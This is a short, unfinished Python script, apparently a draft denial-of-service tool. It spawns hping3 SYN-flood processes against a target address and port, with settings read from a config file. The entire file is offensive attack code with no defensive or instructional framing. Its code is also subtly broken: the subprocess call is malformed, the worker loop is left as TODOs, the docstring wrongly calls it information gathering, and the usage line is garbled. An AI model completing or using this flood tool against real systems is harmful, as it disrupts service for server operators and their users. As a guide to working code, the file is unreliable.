#!/usr/bin/env python3
"""
This modules runs various information gathering functions for a target system

File name: pydos_hping3.py
Author: Konstantinos Christos Liosis
Date created: 31/7/2018
Python Version: 3.6.0

Example execution:
$python sudo pydos_hping3.py
"""

import configparser
from subprocess import run
import sys
import multiprocessing

# parameters loading
params = configparser.ConfigParser()
params.read('params.ini')


def flood_worker(addr, port, interval, payload):
    """
    Each flood worker will be an hping3 flood process
    :param addr: Target server address
    :param port: Target port address
    :return: None
    """

    run('hping3',
        '--syn',
        '-i u' + interval,
        '-d ' + payload,
        '-S',
        '-p ' + port,
        addr)


def main(addr=None, port=None):
    # num of flooding processes
    bots = int(params['DoS']['bots'])
    # packet size
    payload = params['DoS']['payload']
    # interval between packets
    interval = params['DoS']['interval']

    # TODO: argument parsing
    # TODO: multiprocessing workers execution loop

if __name__ == "__main__":
    main(sys.argv)